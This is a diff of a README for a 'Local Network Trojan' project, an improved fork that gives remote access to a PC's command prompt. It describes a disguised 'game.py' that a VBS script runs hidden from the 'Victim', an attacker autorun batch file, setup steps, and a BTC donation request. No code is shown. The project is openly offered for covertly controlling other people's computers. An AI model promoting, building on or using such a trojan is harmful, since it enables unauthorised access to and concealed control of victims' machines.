@@ -1,9 +1,9 @@
 # Local-Network-Trojan-NEW-version-
 This is a project in which we can access a PC/Laptop's CMD
 
-I IMPROVE THIS PROJECT FROM: https://github.com/Ashii198/Local_Network_Trojan
+**I IMPROVE THIS PROJECT FROM:** https://github.com/Ashii198/Local_Network_Trojan
 
-I add:
+**I add:**
 
 - FULL INSTRUCTIONS  
 - "Attacker's autorun.bat"  
@@ -11,7 +11,7 @@ I add:
 - "script.vbs" (for execute "game.py" in background, and the Victim will not use the game, all is hide from the Victim's screen)
 
 
-HERE IS IT A SUMMARY:
+**HERE IS IT A SUMMARY:**
 
 1. Install Python (for Attacker and Victim)
 2. Download this folder (Trojan) and drag in from Downloads to Desktop (for Attacker and Victim)
@@ -35,7 +35,7 @@ THE PROCESS:
 4. Use command "cmdoff"
 
 
-*** READ ALL THE COMPLETED INSTRUCTIONS ON "INSTRUCTIONS.txt" ***
+***READ ALL THE FULL INSTRUCTIONS ON "INSTRUCTIONS.txt"***
 
 However, if you just want to encourage me to continue creating stuff, please consider giving back on **BTC Wallet : bc1q97x54d5dw5m5m2c37pz73h53fzdgsyy0z246vz** my efforts and help it grow by buying me coffee😁🤝
 
